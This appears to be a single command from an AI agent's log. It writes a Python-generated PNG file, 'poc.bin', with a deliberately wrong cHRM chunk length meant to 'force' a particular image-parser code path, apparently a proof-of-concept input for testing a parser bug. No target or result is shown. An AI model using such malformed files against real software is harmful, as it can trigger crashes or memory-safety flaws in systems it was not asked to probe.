Running command: cd /workspace && python - <<'PY'
import struct, zlib, pathlib

def chunk(t, data):
    return struct.pack('>I', len(data)) + t + data + struct.pack('>I', zlib.crc32(t+data)&0xffffffff)

sig=b'\x89PNG\r\n\x1a\n'
ihdr=chunk(b'IHDR', struct.pack('>IIBBBBB',1,1,8,2,0,0,0))
# invalid ancillary chunk length to force parser path
chrm=struct.pack('>I', 31)+b'cHRM'+b'\x00'*31+struct.pack('>I', zlib.crc32(b'cHRM'+b'\x00'*31)&0xffffffff)
idat=chunk(b'IDAT', zlib.compress(b'\x00\x00\x00'))
iend=chunk(b'IEND', b'')
path=pathlib.Path('/workspace/poc.bin')
path.write_bytes(sig+ihdr+chrm+idat+iend)
print('wrote', path.stat().st_size)
PY
